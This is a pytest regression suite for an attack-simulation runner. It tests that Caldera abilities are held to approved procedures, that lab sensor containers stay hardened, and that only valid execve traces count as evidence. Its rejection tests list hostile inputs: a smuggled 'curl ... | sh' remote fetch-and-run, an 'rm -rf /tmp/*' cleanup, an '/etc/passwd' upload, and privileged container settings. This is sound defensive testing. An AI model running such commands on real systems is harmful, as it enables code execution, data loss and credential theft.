"""Regression tests for unattended procedure scope and independent sensor evidence."""

from __future__ import annotations

import json
from datetime import UTC, datetime
from unittest.mock import MagicMock

import httpx
import pytest

from hecate_runner.bas.approved import (
    APPROVED_PROCEDURES,
    select_approved_rule,
    validate_approved_ability,
)
from hecate_runner.bas.base import (
    DetonationRequest,
    DetonationResult,
    DetonationTarget,
    SafetyViolationError,
)
from hecate_runner.bas.caldera import CalderaConnector
from hecate_runner.bas.runtime import run_approved_validation
from hecate_runner.bas.sensor import SENSOR_ENTRYPOINT, LabProcessSensor, parse_exec_trace
from hecate_runner.bas.verifier import DetectionVerifier
from hecate_runner.config import Settings
from hecate_runner.hecate_client import HypothesisResult
from hecate_runner.hunt_writer import DraftHuntRequest, render_draft
from hecate_runner.orchestrator import Orchestrator

RULE = """title: Linux User Discovery
logsource:
  product: linux
  category: process_creation
tags: [attack.t1033]
detection:
  selection:
    Image|endswith: /whoami
  condition: selection
"""


def ability():
    return {
        "ability_id": APPROVED_PROCEDURES["T1033"].ability_id,
        "technique_id": "T1033",
        "executors": [{"platform": "linux", "name": "sh", "command": "whoami"}],
    }


@pytest.mark.parametrize(
    "change",
    [
        {"command": "whoami; curl https://example.test/payload | sh"},
        {"payloads": ["payload"]},
        {"cleanup": ["rm -rf /tmp/*"]},
        {"variations": [{"command": "id"}]},
        {"uploads": ["/etc/passwd"]},
        {"name": "python"},
        {"code": "print('payload')"},
    ],
)
def test_changed_executable_content_is_rejected(change):
    changed = ability()
    changed["executors"][0].update(change)
    with pytest.raises(SafetyViolationError):
        validate_approved_ability(changed, APPROVED_PROCEDURES["T1033"])


def test_unapproved_and_wrong_platform_rules_are_not_executed():
    assert select_approved_rule([{"rule_yaml": RULE}], ["T1033"], ["T1033"])
    assert select_approved_rule([{"rule_yaml": RULE}], ["T1033"], []) is None
    assert select_approved_rule([{"rule_yaml": RULE}], ["T1033.001"], ["T1033"]) is None
    assert (
        select_approved_rule(
            [{"rule_yaml": RULE.replace("linux", "windows")}], ["T1033"], ["T1033"]
        )
        is None
    )


def test_configuration_rejects_unreviewed_or_wildcard_procedures():
    for value in ("*", "T1059.004", '["T1033", "T1003"]'):
        with pytest.raises(ValueError, match="reviewed techniques"):
            Settings(_env_file=None, bas_auto_techniques=value)
    assert Settings(_env_file=None, bas_auto_techniques="T1033,T1057").bas_auto_techniques == [
        "T1033",
        "T1057",
    ]


def test_automation_selects_the_matching_rule_instead_of_the_first_rule(tmp_path, monkeypatch):
    execute = MagicMock(
        return_value={
            "status": "verified_true_positive",
            "telemetry_arrived": True,
            "rule_triggered": True,
        }
    )
    monkeypatch.setattr("hecate_runner.bas.runtime.run_approved_validation", execute)
    settings = Settings(
        _env_file=None,
        hecate_workspace=tmp_path,
        bas_enabled=True,
        bas_mode="caldera",
        bas_auto_execute_live=True,
        bas_auto_techniques=["T1033"],
    )
    req = DraftHuntRequest(
        hunt_id="H-0001",
        generated_at=datetime.now(UTC),
        threat_intel="Test evidence",
        platforms=["linux"],
        hypothesis=HypothesisResult(hypothesis="Discovery", techniques=["T1033"]),
    )
    orchestrator = Orchestrator(settings, MagicMock(), MagicMock())
    orchestrator._run_bas_validation(
        req,
        [{"rule_yaml": RULE.replace("linux", "windows")}, {"rule_yaml": RULE}],
        tmp_path,
        MagicMock(),
    )
    assert execute.call_args.args[2:] == (APPROVED_PROCEDURES["T1033"], RULE)


def test_altered_ability_is_refused_before_any_operation_is_created():
    requests = []

    def handle(request):
        requests.append(request)
        if request.url.path == "/api/v2/agents":
            return httpx.Response(
                200,
                json=[
                    {
                        "paw": "agent",
                        "host": "lab",
                        "platform": "linux",
                        "trusted": True,
                        "group": "staging",
                    }
                ],
            )
        changed = ability()
        changed["executors"][0]["command"] = "curl https://example.test/payload | sh"
        return httpx.Response(200, json=[changed])

    client = httpx.Client(transport=httpx.MockTransport(handle), base_url="http://test")
    connector = CalderaConnector(client=client, allowed_hosts=["lab"])
    request = DetonationRequest(
        hunt_id="H-0001",
        technique_id="T1033",
        ability_id=APPROVED_PROCEDURES["T1033"].ability_id,
        target=DetonationTarget(environment="lab", host="lab"),
        params={"approved_only": True},
    )
    with pytest.raises(SafetyViolationError):
        connector.detonate(request)
    assert all(r.method == "GET" for r in requests)


def test_trace_rejects_failed_out_of_window_and_unrelated_commands():
    trace = """12 100.000 execve("/usr/bin/whoami", ["whoami"], 0x0) = 0
13 101.000 execve("/usr/bin/whoami", ["whoami"], 0x0) = -1 ENOENT
14 102.000 execve("/usr/bin/id", ["id"], 0x0) = 0
15 103.000 execve("/usr/bin/whoami", ["whoami"], 0x0) = 0
16 104.000 execve("/usr/bin/whoami", ["whoami", "--help"], 0x0) = 0
17 105.000 execve("/usr/bin/whoami", ["whoami"], 0x0) = 0"""
    result = parse_exec_trace(trace, start=101, end=104, host="lab", command="whoami")
    assert len(result) == 1
    assert result[0]["ProcessId"] == 15
    assert result[0]["sensor"] == "lab_execve"


def test_trace_reassembles_successful_exec_only():
    trace = """20 101.000 execve("/usr/bin/whoami", ["whoami"], 0x0 <unfinished ...>
20 101.005 <... execve resumed>) = 0
21 102.000 execve("/usr/bin/whoami", ["whoami"], 0x0 <unfinished ...>
21 102.005 <... execve resumed>) = -1 ENOENT"""
    result = parse_exec_trace(trace, start=100, end=103, host="lab", command="whoami")
    assert [e["ProcessId"] for e in result] == [20]


def test_caldera_receipts_cannot_become_sensor_evidence():
    now = datetime.now(UTC).isoformat()
    detonation = DetonationResult(
        success=True,
        hunt_id="H-0001",
        technique_id="T1033",
        ability_id="a",
        provider="caldera",
        start_time_utc=now,
        end_time_utc=now,
        duration_seconds=1,
        exit_code=0,
        stdout="",
        stderr="",
        telemetry_signatures=[{"data_source": "caldera_link", "Image": "/usr/bin/whoami"}],
    )
    verifier = DetectionVerifier()
    assert verifier.verify_detonation(detonation, rule_yaml=RULE).status == "telemetry_missing"
    detonation.telemetry_signatures = [
        {"data_source": "process_creation", "Image": "/usr/bin/whoami"}
    ]
    assert (
        verifier.verify_detonation(detonation, rule_yaml=RULE, raw_events=[]).status
        == "telemetry_missing"
    )


def container_config():
    return {
        "Id": "pinned-container-id",
        "State": {"Running": True},
        "Config": {"Hostname": "lab", "User": "65534:65534", "Entrypoint": SENSOR_ENTRYPOINT},
        "HostConfig": {
            "ReadonlyRootfs": True,
            "CapDrop": ["ALL"],
            "SecurityOpt": ["no-new-privileges=true"],
            "Memory": 268435456,
            "PidsLimit": 128,
        },
        "NetworkSettings": {"Networks": {"hecate-bas-lab": {}}},
        "Mounts": [],
    }


@pytest.mark.parametrize(
    "change",
    [
        {"Privileged": True},
        {"ReadonlyRootfs": False},
        {"CapAdd": ["SYS_PTRACE"]},
        {"PidMode": "host"},
        {"SecurityOpt": ["seccomp=unconfined"]},
        {"Memory": 0},
    ],
)
def test_sensor_rejects_weakened_lab_before_execution(monkeypatch, change):
    container = container_config()
    container["HostConfig"].update(change)
    monkeypatch.setattr(LabProcessSensor, "_docker", lambda *args: json.dumps([container]))
    with pytest.raises(SafetyViolationError):
        LabProcessSensor("agent", "lab").preflight()


def test_preflight_failure_does_not_schedule_operation(tmp_path, monkeypatch):
    provider = MagicMock()
    monkeypatch.setattr("hecate_runner.bas.get_bas_provider", lambda *args: provider)

    def refuse(self):
        raise SafetyViolationError("sensor unavailable")

    monkeypatch.setattr(LabProcessSensor, "preflight", refuse)
    settings = Settings(
        _env_file=None,
        hecate_workspace=tmp_path,
        bas_enabled=True,
        bas_mode="caldera",
        bas_telemetry="lab_process",
        bas_auto_techniques=["T1033"],
        bas_allowed_hosts=["lab"],
        bas_linux_host="lab",
        caldera_agent_group="hecate-local-lab",
    )
    result = run_approved_validation(settings, "H-0001", APPROVED_PROCEDURES["T1033"], RULE)
    provider.detonate.assert_not_called()
    assert result["status"] == "error"
    path = next((tmp_path / ".hecate/bas/runs").glob("*.json"))
    assert path.stat().st_mode & 0o777 == 0o600
    assert json.loads(path.read_text())["reason"] == "sensor unavailable"


@pytest.mark.parametrize("platforms,rules", [(["windows"], [{"rule_yaml": RULE}]), (["linux"], [])])
def test_unsupported_hunts_record_skip_without_claiming_verification(
    tmp_path, monkeypatch, platforms, rules
):
    runner = MagicMock()
    monkeypatch.setattr("hecate_runner.bas.runtime.run_approved_validation", runner)
    settings = Settings(
        _env_file=None,
        hecate_workspace=tmp_path,
        bas_enabled=True,
        bas_mode="caldera",
        bas_auto_execute_live=True,
        bas_auto_techniques=["T1033"],
    )
    orchestrator = Orchestrator(settings, MagicMock(), MagicMock())
    req = DraftHuntRequest(
        hunt_id="H-0001",
        generated_at=datetime.now(UTC),
        hypothesis=HypothesisResult(hypothesis="Discovery", techniques=["T1033"]),
        threat_intel="Test evidence",
        platforms=platforms,
    )
    orchestrator._run_bas_validation(req, rules, tmp_path, MagicMock())
    runner.assert_not_called()
    assert req.bas_verification["status"] == "skipped"
    text = render_draft(req)
    assert 'bas_status: "skipped"' in text
    assert "bas_verified:" not in text
    assert "**Skipped:**" in text
